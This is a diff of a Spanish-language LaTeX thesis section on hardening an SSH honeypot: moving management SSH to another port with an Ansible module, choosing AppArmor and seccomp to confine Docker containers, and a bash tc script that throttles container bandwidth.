 \subsection{Configuración del SSH de gestión}
 
+Nuestra sonda expone el puerto tradicional de SSH para que sea atacado, pero aun se necesita conectarse via SSH para configurar el servidor,
+instalar paquetes, etc.
 
-% reduccion de servicios expuestos excepto ssh.
-% mover ssh de gestion a otro puerto, y limitar las funciones y accesos.
-% configuracion de firewall.
+Utilizamos \href{https://github.com/dev-sec/ansible-ssh-hardening}{un modulo de Ansible} para securizar el servicio SSH. 
+Dicho modulo se encarga de:
 
-\subsubsection{securizacion del sistema de containers}
+\begin{itemize}
+    \item Configurar el servicio para levantarse en otro puerto, en nuestro caso el 30009. 
+    La seguridad por oscuridad no aporta valor añadido pero reduce el número de ataques que recibimos. 
+    \item Deshabilita el uso de agentes SSH.
+    \item Deshabilita el inicio de sesion para root.
+    \item Deshabilita el reenvio de tráfico a traves de tuneles TCP.
+    \item Deshabilita SFTP como servicio de transferencia, ya que puede ser usado para explorar el sistema de archivos del servidor.
+    \item Configura SSH para no usar algoritmos de cifrado debiles. 
+\end{itemize}
 
-% utilizacion de AppArmor
-% utilizacion de seccomp
-% limitacion de ancho de banda usando TC
+\subsection{securizacion del sistema de containers}
+
+Las opciones de securización vienen condicionadas por haber escogido \emph{Docker} como sistema ejecución de containers
+y \emph{Debian} como sistema operativo. 
+
+En Linux podemos usar varios modulos del kernel que implementan un sistema \emph{MAC (Mandatory Access Control)} en lugar de \emph{DAC (Discretionary Access Control)}. 
+Basicamente si el acceso es de tipo DAC, como el tradicional en sistemas unix, la capacidad o no de realizar una acción viene determinado por el actor que inicia la acción y las comprobaciones
+para saber si puede ejercer la accion el objeto sobre el que actua se limitan a comprobar que sea dueño del mismo o el grupo al que pertenece el actor lo sea.
+
+En un sistema \emph{MAC}, las politicas de que está permitido o no involucran a los actores que inician la acción y los objetos sobre los que estos actuan, pudiendo
+limitar incluso al dueño del objeto a realizar ciertas acciones.
+
+De los sistemas que implementan un control tipo MAC en linux, podemos enumerar las principales alternativas:
+
+\begin{itemize}
+    \item[\emph{SELinux}] desarrollado por la \emph{NSA} pero mantenido principalmente por \emph{Redhat}, aunque esta integrado como modulo de kernel,
+    las herramientas y politicas solo se desarrollan y mantiene para distribuciones tipo \emph{Redhat} como \emph{RHEL,Fedora o CentOS} y derivadas de estas.
+    El soporte de \emph{Debian} para \emph{SELinux} aunque existe no esta mantenido oficialmente, lo que hace inviable ésta opción. En SELinux los objetos (ficheros, conexiones de red) se identifican por
+    un identificador que es invariable aunque la ruta al fichero cambie. 
+    \item[\emph{AppArmor}] desarrollado principalmente por \emph{SuSE Linux} y \emph{Canonical}, está integrado en el kernel pero al igual que \emph{SELinux} 
+    el soporte de herramientas y politicas existe principalmente en distribuciones \emph{SuSE}, \emph{Ubuntu} y \emph{Debian}. En AppArmor las politicas hacen referencia a rutas y no 
+    a identificadores de fichero, lo que es una merma en las capacidades de securizar de \emph{AppArmor}.
+    \item[\emph{TOMOYO}] Desarrollado por \emph{NTT Group}, parece que su uso y comunidad es muy pequeña comparado con las alternativas y que no está activamente mantenido. Similar a \emph{AppArmor} en filosofía.
+    \item[\emph{grsecurity}] Es un conjunto de parches para el kernel desarrollado por Brad Spengler de \emph{Open Source Security, inc} hasta septiembre de 2015 se ofrecian parches al publico de versiones estables y de pruebas del kernel. 
+    Despues de septiembre de 2015, sólo se ofrecian parches para versiones de prueba al público en general y para versiones estables para suscriptores de pago. En abril de 2017 también cerraron la descarga de parches
+    para versiones de prueba. grsecurity ofrece el conjunto de parches y herramientas más completa y controvertida de las opciones a escoger. Instalar los parches de grsecurity en un kernel
+    no garantizan compatibilidad con aplicaciones existentes, sin embargo su control \emph{MAC} basado en roles y el conjunto de mejoras de seguridad al kernel, la convierten en una opción atractiva de no ser por su modelo de distribución y sus problemas de compatibilidad.
+\end{itemize}
+
+Como resultado, escogeremos \emph{AppArmor} \cite{wiki-apparmor} para implementar nuestras politicas \emph{MAC}. \emph{Docker} soporta ser lanzado con perfiles de \emph{AppArmor} \cite{docker-doc-apparmor}, que permiten
+limitar el conjunto de acciones que las aplicaciones podran realizar \textbf{dentro} del container. Existiran otros perfiles de \emph{AppArmor} que permiten limitar el comportamiento
+de Docker con el sistema que aloja \emph{containers}.
+\ \\
+\emph{Seccomp} \cite{wiki-seccomp} es una capacidad del kernel, que permite a procesos descartar privilegios de acceso a \emph{syscalls} 
+que no necesitan. En el contexto de limitación de \emph{containers}, \emph{AppArmor} da un control más granular sobre que se permite 
+o no ejecutar a un container mientras que seccomp complementa 
+la proteccion para acciones que no tengan sentido para ese container.
+
+\ \\
+Por ejemplo, podemos restringir la syscall \emph{sethostname} para un \emph{container} 
+que ejecute un servidor web que dificilmente necesitará realizar esa operación.
+
+\subsubsection{Limitación del ancho de banda usado por procesos que se ejecutan en \emph{containers}}
+
+Cuando creamos el \emph{container} con el servicio expuesto, creamos una red propia para este \emph{container}. Puede verse
+en el listado del código \ref{listing:ssh-docker-compose} en el apartado \emph{networks}.
+Docker crea un dispositivo de red virtual al que asocia un dispositivo \emph{bridge} virtual, esto es necesario para que el 
+\emph{container} tenga un \emph{namespace} \cite{wiki-namespaces} de red propio. Por defecto, a no ser que configuremos \emph{Docker}
+de otra manera, se crearan reglas en \emph{iptables} para que este \emph{bridge} pueda salir a internet, y de esta manera los 
+\emph{containers} que utilicen esta red tengan conexión a internet.
+Esto es conveniente, los \emph{containers} suelen necesitar acceso a la red, especialmente si son servicios expuestos a clientes, pero en el caso de la \emph{honeypot} pese a que deseamos que el atacante tenga
+conexión a internet (muchos scripts de atacantes si detectan que no hay conexión a internet, simplemente no hacen nada porque sospechan 
+de estar en una \emph{honeypot}), no queremos colaborar de manera activa con el ataque que se este llevando a cabo.
+La solución a esta aparente contradicción, es permitir el acceso a internet pero limitando la velocidad de la conexión a una tan baja que un ataque
+de tipo \emph{DDoS}.
+
+Para ello utilizaremos una herramienta llamada \emph{traffic control (tc)} (véase \cite{man-tc}) que nos permite manipular la gestión de trafico del kernel
+para nuestros dispositivos de red.
+
+Como puede verse en el script listado como código \ref{listing:tc-manager-script}, que se lanza desde el \emph{daemon} de gestión de containers (código \ref{listing:containersvc-bash})
+con la red de docker del \emph{container} como argumento. La primera función del script que gestiona \emph{tc} es a partir del
+nombre de red de Docker, averiguar a que dispositivo \emph{bridge} pertenece y modificar las politicas de tráfico de dicho \emph{bridge}.
+
+Respecto a las politicas de tráfico en concreto, reducimos el ancho de banda de descarga y subida a 56KiB y añadimos una latencia
+de 50ms a la red. 
+
+Se crean clases de tráfico, donde el tráfico SSH y el tráfico de diagnosis (ICMP) se marca como prioritario (priorizamos la conexión del servicio expuesto),
+el resto del tráfico se entregará con el ancho de banda disponible.
 
 
-%  * Notificacion de nuevas trazas.
-% Despliegue
-%  * Mantenimiento de la arquitectura usando Ansible.
+\begin{minted}[fontsize=\scriptsize]{console}
+    #!/bin/bash -x
+    
+    clean_rules() {
+        local iface=$1
+        tc qdisc del dev $iface root    2> /dev/null > /dev/null
+        tc qdisc del dev $iface ingress 2> /dev/null > /dev/null
+    }
+    
+    start_traffic_shape(){
+        local iface="$1"
+        local maxbwidth_download="${2:-56}"
+        local maxbwidth_upload="${3:-56}"
+        local latency_added="${4:-50ms}"
+        local burst_allowed="${5:-1540}"
+    
+        # clean existing down- and uplink qdiscs, hide errors
+        tc qdisc del dev $iface root    2> /dev/null > /dev/null
+        tc qdisc del dev $iface ingress 2> /dev/null > /dev/null
+    
+        ###### uplink
+    
+        # install root HTB, point default traffic to 1:20:
+    
+        tc qdisc add dev $iface root handle 1: htb default 20
+    
+        # shape everything at $UPLINK speed - this prevents huge queues in your
+        # DSL modem which destroy latency:
+    
+        tc class add dev $iface parent 1: classid 1:1 htb rate ${maxbwidth_upload}kbit burst 6k
+    
+        # high prio class 1:10:
+    
+        tc class add dev $iface parent 1:1 classid 1:10 htb rate ${maxbwidth_upload}kbit \
+        burst 6k prio 1
+    
+        # bulk & default class 1:20 - gets slightly less traffic,
+        # and a lower priority:
+    
+        tc class add dev $iface parent 1:1 classid 1:20 htb rate $[9*$maxbwidth_upload/10]kbit \
+        burst 6k prio 2
+    
+        # both get Stochastic Fairness:
+        tc qdisc add dev $iface parent 1:10 handle 10: sfq perturb 10
+        tc qdisc add dev $iface parent 1:20 handle 20: sfq perturb 10
+    
+        # TOS Minimum Delay (ssh, NOT scp) in 1:10:
+        tc filter add dev $iface parent 1:0 protocol ip prio 10 u32 \
+        match ip tos 0x10 0xff  flowid 1:10
+    
+        # ICMP (ip protocol 1) in the interactive class 1:10 so we
+        # can do measurements & impress our friends:
+        tc filter add dev $iface parent 1:0 protocol ip prio 10 u32 \
+        match ip protocol 1 0xff flowid 1:10
+    
+        # To speed up downloads while an upload is going on, put ACK packets in
+        # the interactive class:
+    
+        tc filter add dev $iface parent 1: protocol ip prio 10 u32 \
+        match ip protocol 6 0xff \
+        match u8 0x05 0x0f at 0 \
+        match u16 0x0000 0xffc0 at 2 \
+        match u8 0x10 0xff at 33 \
+        flowid 1:10
+    
+        # rest is 'non-interactive' ie 'bulk' and ends up in 1:20
+    
+    
+        ########## downlink #############
+        # slow downloads down to somewhat less than the real speed  to prevent
+        # queuing at our ISP. Tune to see how high you can set it.
+        # ISPs tend to have *huge* queues to make sure big downloads are fast
+        #
+        # attach ingress policer:
+    
+        tc qdisc add dev $iface handle ffff: ingress
+    
+        # filter *everything* to it (0.0.0.0/0), drop everything that's
+        # coming in too fast:
+    
+        tc filter add dev $iface parent ffff: protocol ip prio 50 u32 match ip src \
+        0.0.0.0/0 police rate ${maxbwidth_download}kbit burst 10k drop flowid :1
+    
+    }
+    
+    get_bridge_docker_device(){
+        local _outvar=$1
+        local docker_network_name=$2
+        local docker_network_id=$(docker network ls | grep $docker_network_name | cut -f1 -d' ')
+        local result=""
+        if [[ -z "$docker_network_id" ]]; then
+            echo "unable to get bridge id from docker, refusing to continue, maybe it not exists?"
+            result="NO_DEV"
+            eval $_outvar=\$result
+        return
+        fi
+        IFACE="br-$docker_network_id"
+        ifconfig $IFACE &> /dev/null
+        if [[ $? -ne 0 ]]; then
+            echo "unable to contact bridged interface <$IFACE>, refusing to continue"
+            result="NO_DEV"
+            eval $_outvar=\$result
+        return
+        fi
+        result="br-$docker_network_id"
+        eval $_outvar=\$result
+    }
+    
+    do_start() {
+        local iface=""
+        local docker_network_name=$1
+        get_bridge_docker_device "iface" "$docker_network_name"
+        if [[ "$iface" == "NO_DEV" ]]; then
+          echo "unable to get interface, refusing to continue"
+          exit 1
+        fi
+        clean_rules $iface
+        start_traffic_shape $iface
+    }
+    
+    do_stop() {
+        local iface=""
+        local docker_network_name=$1
+        get_bridge_docker_device "iface" "$docker_network_name"
+        if [[ "$iface" == "NO_DEV" ]]; then
+          echo "unable to get interface, maybe it not exists"
+          exit 0
+        fi
+        clean_rules $iface
+    }
+    
+    do_status() {
+        local number_of_rules=$(tc qdisc show | wc -l)
+        if [[ $number_of_rules -gt 2 ]]; then
+            echo "$0 is ENABLED"
+        else
+            echo "$0 is DISABLED"
+        fi
+    }
+    
+    
+    case "$1" in
+       start)
+         do_start $2
+         ;;
+       stop)
+         do_stop $2
+         ;;
+       restart)
+         do_stop $2
+         do_start $2
+         ;;
+       status)
+         do_status
+         ;;
+       *)
+         echo "Usage: /etc/init.d/$NAME start DOCKER_NETWORK_NAME | stop DOCKER_NETWORK_NAME | status"
+         exit 1
+         ;;
+    esac
+    
+    exit 0    
+\end{minted}
+\captionof{listing}{\emph{tc\_manager} script que controla ancho de banda usado en \emph{Docker} \label{listing:tc-manager-script}}
+\bigskip
+
+
+
 
 \section{Planificación}
 
